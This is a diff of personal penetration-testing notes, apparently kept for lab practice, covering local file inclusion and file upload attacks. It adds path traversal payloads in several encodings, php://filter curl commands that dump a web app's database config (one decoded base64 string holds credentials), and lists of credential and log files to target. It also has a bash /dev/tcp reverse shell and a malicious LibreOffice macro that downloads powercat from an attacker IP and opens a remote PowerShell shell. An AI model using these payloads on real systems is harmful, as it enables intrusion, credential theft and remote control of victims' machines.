@@ -16,12 +16,9 @@ If SQLi on windows target, start `smbserver.py test . -smb2support` and try appe
 ---
 #### Search for Services
 Google the http-title
-
 `searchsploit service version`
-
 `searchsploit /path/to/exploit -m`
 - copy to current directory
-
 `searchsploit /path/to/exploit -x`
 - view exploit
 
@@ -36,11 +33,79 @@ Google the http-title
 ..\..\..\..\..\Windows\boot.ini
 ```
 - windows
+```
+../../../../../../Windows/boot.ini
+```
+- forward slash
+```
+..\\..\\..\\..\\..\\Windows\\boot.ini
+```
+- double slash
+```
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cboot.ini
+```
+- single encoding
+```
+%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cboot.ini
+```
+- double encoding
+```
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/Windows/boot.ini
+```
+- mixed slash with single encoding
 - also sometimes forward slashes work `../../../../../../Windows/boot.ini`
 - nested traversal sequences, such as `....//` or `....\/`
 - URL encoding `../` = `%2e%2e%2f` and double URL encoding = `%252e%252e%252f` non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`
 - may require the user-supplied filename to start with the expected base folder, such as `filename=/var/www/images/../../../etc/passwd`
 - may require the user-supplied filename to end with an expected file extension, such as .png, for ex: `filename=../../../etc/passwd%00.png`
+- null byte injection `../../../../../../../var/www/html/db.php%00`
+- fake extensions like:
+	- `../../../../../../../var/www/html/db.php.txt
+	- `../../../../../../../var/www/html/db.php.bak`
+	- `../../../../../../../var/www/html/db.php.swp`
+- PHP filter with `php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/db.php`
+```
+curl "http://192.168.221.58/image.php?img=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/db.php"
+```
+- output will show base64:
+![[Pasted image 20250603115345.png]]
+```
+echo "PD9waHAKZGVmaW5lKCdEQkhPU1QnLCAnMTI3LjAuMC4xJyk7CmRlZmluZSgnREJVU0VSJywgJ3Jvb3QnKTsKZGVmaW5lKCdEQlBBU1MnLCAnTWFsYXByb3BEb2ZmVXRpbGl6ZTEzMzcnKTsKZGVmaW5lKCdEQk5BTUUnLCAnU2ltcGxlUEhQR2FsJyk7Cj8+Cg==" | base64 -d
+```
+![[Pasted image 20250603115432.png]]
+- other locations to check:
+```
+curl "http://192.168.221.58/image.php?img=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/functions.php"
+```
+```
+curl "http://192.168.221.58/image.php?img=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/config.php"
+```
+System files:
+```
+/etc/passwd
+/etc/shadow
+/etc/hostname
+/etc/hosts
+/etc/mysql/my.cnf
+/etc/php.ini
+/etc/httpd/conf/httpd.conf
+/etc/apache2/apache2.conf
+```
+Web app files:
+```
+/var/www/html/db.php
+/var/www/html/config.php
+/var/www/html/functions.php
+/var/www/html/.env
+/var/www/html/index.php
+```
+Log poisoning:
+```
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+```
 ###### Second-Order LFI attack
 - if you also have ability to create a user account & access a URL subdirectory that contains your username, try naming the account "../../../etc/passwd" then accessing that URL
 	- might need to use null bye injection or other bypass to end string if subdirectory of URL isn't end of URL
@@ -48,7 +113,7 @@ Google the http-title
 			- try: /profile/../../../etc/passwd%00
 
 ---
-#### File Upload
+## File Upload
 Upload filters are either:
 1. File Extensions
 2. Content-Type
@@ -87,7 +152,7 @@ cp dank.php dank.php.jpg
 - upload dank.php.jpg to site, capture with burp and change name to dank.php
 - open image of file in browser and add ?cmd=id to the end to see if code executes. if so, start `nc -lvnp 443` and run:
 ```
-bash -c 'bash -i >%26 /dev/tcp/10.10.14.172/443 0>%261'
+bash -c 'bash -i >%26 /dev/tcp/192.168.45.160/443 0>%261'
 ```
 - or other shells
 ##### Magic Number
@@ -157,7 +222,34 @@ python3 dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/90
 zip rev.0xdf rev.php
 ```
 - upload rev.0xdf, start listener, access page: http://dev.siteisup.htb/?page=phar://uploads/1f034331994c02c3c036237afbb4975c/rev.0xdf/rev
-
+#### File upload only allows .odt file = malicious macro
+- open libreoffice and "save as", name it anything
+- Tools -> Macros -> Organize Macros -> Basic
+- select current document -> New -> Name the module anything (Evil)
+![[Pasted image 20250519182345.png]]
+```
+Shell("cmd /c powershell iwr [http://192.168.45.160/](http://192.168.45.160/)")
+```
+![[Pasted image 20250519182544.png]]
+- Save, close macro window, back to main document
+- Tools -> Customize
+![[Pasted image 20250519182636.png]]
+- Events tab -> Open Document -> Assign: Macro
+![[Pasted image 20250519182725.png]]
+- select most nested folder from dropdown within our document -> OK
+![[Pasted image 20250519182805.png]]
+- should show assigned action -> OK
+upload it and it should show up in listener in a few seconds
+![[Pasted image 20250519182907.png]]
+- means its working, but need to update script in macro
+remove macro from Tools -> Customize section -> Tools -> Macros > edit macro and update the macro
+![[Pasted image 20250519183106.png]]
+```
+Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.160/powercat.ps1');powercat -c 192.168.45.160 -p 135 -e powershell")
+```
+- go back to Tools > Customize and reassign macro, start listener, and upload again
+![[Pasted image 20250519183159.png]]
+---
 ###### Binwalk 2.3.2 Vuln
 ```
 ssh-keygen -t ed25519 -f ./id_ed25519
